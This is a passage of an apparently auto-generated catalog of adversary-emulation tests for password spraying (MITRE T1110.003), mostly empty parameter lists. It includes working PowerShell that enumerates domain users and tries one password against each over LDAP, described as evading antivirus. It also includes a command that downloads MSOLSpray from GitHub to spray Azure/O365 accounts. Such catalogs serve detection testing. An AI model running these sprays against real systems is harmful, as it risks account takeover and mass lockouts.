<p><strong>get_prereq_command</strong>: Install-Module -Name AzureAD -Force</p>
</li>
<li>
<p><strong>cleanup_command</strong>: </p>
</li>
<li><strong>mitre_id</strong>: T1110.003</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: {'description': 'Single password we will attempt to auth with (if you need several passwords, then it is a bruteforce so see T1110.001)', 'type': 'string', 'default': 'P@ssw0rd!'}</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: b15bc9a5-a4f3-4879-9304-ea0011ace63a</li>
<li><strong>name</strong>: Password Spray Invoke-DomainPasswordSpray Light</li>
<li>
<p><strong>description</strong>: Perform a domain password spray using the same core method of the <a href="https://github.com/dafthack/DomainPasswordSpray">DomainPasswordSpray tool</a> 
but without all the extra code that makes the script get blocked by many AVs. 
This atomic test will attempt a single password against all users in a password list at $env:Temp\usersdpsLight.txt. You can create this file manually
or with the automated prereq_command. The prereq_command will limit the user list to 200 users by default to help you avoid massive account lockout.</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: function Invoke-dpsLight ($Password, $userlist) {
$users = Get-Content $userlist
$Domain = "LDAP://" + ([ADSI]"").distinguishedName
foreach ($User in $users) {
  $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain, $User, $Password)
  if ($Domain_check.name -ne $null) {
    Write-Host -ForegroundColor Green "Password found for User:$User Password:$Password"
  }
  else { Write-Host ". " -NoNewline}
}
Write-Host -ForegroundColor green "Finished"
}
Invoke-dpsLight "#{password}" $env:Temp\usersdpsLight.txt</p>
</li>
<li>
<p><strong>prereq_command</strong>: if (Test-Path  $env:Temp\usersdpsLight.txt) {exit 0} else {exit 1}</p>
</li>
<li>
<p><strong>get_prereq_command</strong>: Write-Host -NoNewLine "Reading Users." # this code modifed from https://github.com/ZoomerHulkHogan/Powershell-Domain-User-Enumeration
$netOutput = net users /domain
$netOutput = <a href="$netOutput[6..($netOutput.length-3)]">System.Collections.ArrayList</a>
$userLimit = #{user_limit}; $usercount = 0
foreach ($line in $netOutput) {
  if($usercount -ge $userLimit){break}
  $line = $line.trim()
  $line = $line -split '\s\s+'
  foreach ($user in $line){
    if($usercount -ge $userLimit){break}
    Add-Content $env:Temp\usersdpsLight.txt $user
    $usercount = $usercount + 1
    }<br />
}
Write-Host "Usernames saved to $env:Temp\usersdpsLight.txt"</p>
</li>
<li>
<p><strong>cleanup_command</strong>: </p>
</li>
<li><strong>mitre_id</strong>: T1110.003</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: {'description': 'The password to try for each user in users.txt', 'type': 'string', 'default': 'Spring2020'}</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: f3a10056-0160-4785-8744-d9bd7c12dc39</li>
<li><strong>name</strong>: Password Spray Microsoft Online Accounts with MSOLSpray (Azure/O365)</li>
<li>
<p><strong>description</strong>: This test attempts to brute force a list of Microsoft Online (Azure/O365) users with a single password via the MSOLSpray Powershell module.</p>
</li>
<li>
<p><strong>platforms</strong>: ['azure-ad']</p>
</li>
<li>
<p><strong>command</strong>: import-module "PathToAtomicsFolder..\ExternalPayloads\MSOLSpray.ps1"
Invoke-MSOLSpray -UserList "#{user_list}" -Password "#{password}"</p>
</li>
<li>
<p><strong>prereq_command</strong>: if (test-path "PathToAtomicsFolder..\ExternalPayloads\MSOLSpray.ps1"){exit 0} else {exit 1}</p>
</li>
<li>
<p><strong>get_prereq_command</strong>: New-Item -Type Directory "PathToAtomicsFolder..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
invoke-webrequest "https://raw.githubusercontent.com/dafthack/MSOLSpray/922f159104fb3ec77c9fc6507a6388a05c227b5f/MSOLSpray.ps1" -outfile "PathToAtomicsFolder..\ExternalPayloads\MSOLSpray.ps1"</p>
</li>
<li>
<p><strong>cleanup_command</strong>: </p>
</li>
<li><strong>mitre_id</strong>: T1110.003</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: {'description': 'Single password to try against the list of user accounts', 'type': 'string', 'default': 'P@ssword1'}</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>